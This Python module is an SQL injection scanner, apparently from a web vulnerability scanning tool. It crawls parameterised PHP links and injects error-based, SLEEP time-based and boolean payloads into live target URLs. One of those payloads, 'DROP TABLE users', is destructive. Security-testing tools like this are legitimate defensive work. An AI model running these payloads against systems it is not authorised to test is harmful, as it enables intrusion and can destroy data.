import re
import time
import random
import string
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from scanner.utils.http import fetch_url

class SQLInjectionScannerModule:
    def __init__(self):
        self.error_signatures = [
            "SQL syntax.*MySQL",
            "Warning.*mysql_",
            "valid MySQL result",
            "check the manual that corresponds to your MySQL server version",
            "mysql_fetch_array()",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "pg_query()",
            "Warning.*pg_",
            "Microsoft OLE DB Provider for SQL Server",
            "SQLSTATE",
            "Syntax error in string in query expression",
            "Fatal error",
            "OperationalError"
        ]
        self.time_delay = 5  # seconds for time-based testing

    def run_test(self, domain, crawled_links):
        findings = {}

        php_links = [link for link in crawled_links if link.endswith(".php")]
        param_links = []

        for link in php_links:
            response = fetch_url(link)
            if not response:
                continue

            found_links = re.findall(r'href=["\'](.*?\.php\?.*?)["\']', response.text, re.IGNORECASE)
            for found in found_links:
                full_url = urljoin(link, found)
                param_links.append(full_url)

        print(f"Param Links for SQLi: {param_links}")

        for link in param_links:
            normal_response = fetch_url(link)
            if not normal_response:
                continue

            print(f"Testing URL (GET): {link}")

            # 1. Error-Based Detection
            error_based = self.error_based_sqli(link)
            if error_based:
                findings.update(error_based)
                continue  # skip others if already vulnerable

            # 2. Time-Based Detection
            time_based = self.time_based_sqli(link)
            if time_based:
                findings.update(time_based)
                continue

            # 3. Boolean-Based Detection
            boolean_based = self.boolean_based_sqli(link)
            if boolean_based:
                findings.update(boolean_based)

        if not findings:
            findings["Info"] = "No obvious SQL Injection vulnerabilities found."

        return {
            "module": "SQL Injection Scanner",
            "findings": findings
        }

    def error_based_sqli(self, url):
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL, NULL, NULL --",
            "' OR 1=1 --",
            "\" OR \"\" = \""
        ]

        for payload in payloads:
            test_url = self.inject_payload(url, payload)
            response = fetch_url(test_url)

            if not response:
                continue

            if response.status_code in [500, 400]:
                return {test_url: f"Potential SQL Injection vulnerability! (HTTP {response.status_code})"}

            for signature in self.error_signatures:
                if re.search(signature, response.text, re.IGNORECASE):
                    return {test_url: f"Potential SQL Injection vulnerability detected (signature: {signature})"}

        return None

    def time_based_sqli(self, url):
        # Inject sleep payload
        delay_payload = "' OR SLEEP(5)-- "
        test_url = self.inject_payload(url, delay_payload)

        start_time = time.time()
        response = fetch_url(test_url)
        end_time = time.time()

        if not response:
            return None

        elapsed = end_time - start_time

        if elapsed > self.time_delay - 1:
            return {test_url: "Potential Time-Based Blind SQL Injection vulnerability (delay observed)"}

        return None

    def boolean_based_sqli(self, url):
        true_payload = "' OR 1=1-- "
        false_payload = "' OR 1=2-- "

        true_url = self.inject_payload(url, true_payload)
        false_url = self.inject_payload(url, false_payload)

        true_response = fetch_url(true_url)
        false_response = fetch_url(false_url)

        if not true_response or not false_response:
            return None

        if len(true_response.text) != len(false_response.text):
            return {true_url: "Potential Boolean-Based Blind SQL Injection vulnerability (response length mismatch)"}

        return None

    def inject_payload(self, url, payload):
        """
        Inject SQL payload into the first parameter.
        """
        if "?" not in url:
            return url

        base, params = url.split("?", 1)
        param_parts = params.split("&")
        first_param = param_parts[0].split("=")[0]

        new_param = f"{first_param}={payload}"
        new_params = "&".join([new_param] + param_parts[1:])

        return f"{base}?{new_params}"
